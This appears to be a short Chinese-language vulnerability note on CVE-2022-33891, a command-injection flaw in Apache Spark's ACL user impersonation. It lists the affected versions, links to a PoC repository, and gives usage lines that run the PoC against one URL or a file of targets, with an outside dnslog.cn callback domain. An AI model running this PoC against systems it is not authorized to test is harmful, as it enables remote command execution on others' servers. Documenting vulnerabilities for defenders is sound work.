# cve-2022-33891

## 来源

[https://github.com/W01fh4cker/cve-2022-33891](https://github.com/W01fh4cker/cve-2022-33891)

## 影响范围

-   Apache Spark <= 3.0.3
-   3.1.1 <= Apache Spark <= 3.1.2
-   3.2.0 <= Apache Spark <= 3.2.1

## 简介

Apache Spark UI 提供了通过配置选项 spark.acls.enable 启用 ACL 的可能性。如果启用了 ACL，则 HttpSecurityFilter 中的代码路径可以允许攻击者通过提供任意用户名来执行模拟。因此，攻击者能够访问权限检查功能，该功能最终将根据攻击者的输入构建一个 Unix shell 命令并执行。

Usage:
```python
pip3 install requests

# If you do not use the -d parameter, the dnslog domain name will be automatically applied for you.
# 如果你不使用-d参数，则会自动为您申请dnslog域名。

python3 cve_2022_33891_poc.py -u http://127.0.0.1
python3 cve_2022_33891_poc.py -f url.txt

python3 cve_2022_33891_poc.py -u http://127.0.0.1 -d ngpc6c.dnslog.cn
python3 cve_2022_33891_poc.py -f url.txt -d ngpc6c.dnslog.cn

```
